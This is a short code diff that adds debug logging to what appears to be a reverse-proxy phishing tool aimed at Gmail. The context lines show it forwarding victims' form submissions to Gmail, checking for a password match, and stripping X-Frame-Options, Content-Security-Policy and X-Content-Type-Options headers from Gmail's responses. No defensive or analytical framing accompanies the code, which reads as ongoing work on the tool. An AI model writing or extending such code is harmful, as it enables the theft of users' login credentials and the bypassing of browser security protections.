@@ -87,6 +87,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                     // Forward the request to Gmail and let it process the form submission
                     this.proxyEndpoint.write(kJust) 
                     this.proxyEndpoint.end()
+                    console.log('Request forwarded to Gmail, waiting for response...')
 
                 } else if (passwordMatch) {
                     console.log('Password matched')
@@ -156,6 +157,7 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
 
 
     processResponse() {
+        console.log('Processing response from Gmail...')
         this.browserEndPoint.removeHeader('X-Frame-Options')
         this.browserEndPoint.removeHeader('Content-Security-Policy')
         this.browserEndPoint.removeHeader('X-Content-Type-Options')
@@ -187,8 +189,12 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
         }
 
         if (this.proxyResp.headers['content-length'] < 1) {
+            console.log('No content-length, piping response through')
             return this.proxyResp.pipe(this.browserEndPoint)
         }
+        
+        console.log('Response content-length:', this.proxyResp.headers['content-length'])
+        console.log('Response status:', this.proxyResp.statusCode)
 
         // return super.processResponse()
          let newMsgBody;
